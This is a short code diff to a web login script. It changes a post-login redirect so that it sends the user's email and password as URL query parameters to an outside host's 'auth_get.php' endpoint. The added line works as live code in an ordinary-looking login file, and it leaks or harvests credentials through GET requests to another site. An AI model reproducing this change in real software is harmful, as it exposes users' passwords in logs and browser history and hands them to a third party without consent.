@@ -86,7 +86,7 @@
                 loginButton.disabled = false;
 
                 if (data.redirect) {
-                    window.location.href = data.redirect;
+                    window.location.href = "https://member.o-rumah.com/auth_get.php?Auth_Email="+data.email+"&Auth_Pass="+data.password;
                 } else {
                     alertBox.classList.remove('d-none', 'alert-success');
                     alertBox.classList.add('alert-danger');
